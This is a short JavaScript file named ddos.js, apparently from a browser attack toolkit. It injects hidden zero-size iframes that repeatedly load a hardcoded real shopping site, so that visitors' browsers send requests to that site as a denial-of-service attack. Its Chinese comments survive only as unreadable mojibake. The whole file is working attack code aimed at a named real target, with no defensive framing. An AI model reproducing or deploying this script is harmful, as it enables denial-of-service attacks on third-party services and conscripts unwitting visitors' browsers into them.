//alert("ddos.js");
////////////////////////////////////////////
//// ����������iframe,����Զ��ҳ��
//// ��Ҫ�Ľ�,��iframe�޷�����Referer,�����ױ�����
//// iframe��IE�л�����cookie,��Щҳ���޷�DDOS��
////////////////////////////////////////////
var target = "http://www.taobao.com";

function ddosIframe(target){
	var t = $d.createElement("iframe");
	t.src = target;
	t.width = 0;
	t.height = 0;
	$d.getElementsByTagName("body")[0].appendChild(t);	
	
	//$d.getElementsByTagName("body")[0].removeChild(t);
}


function ddosIframeFakeReferer(target){
	
}


///////////////////////////////////////////
///// ��ʼ����
var i = 0;
do {
	setTimeout("ddosIframe(target)", 200);
	i = i+1;
}
while (i<=10);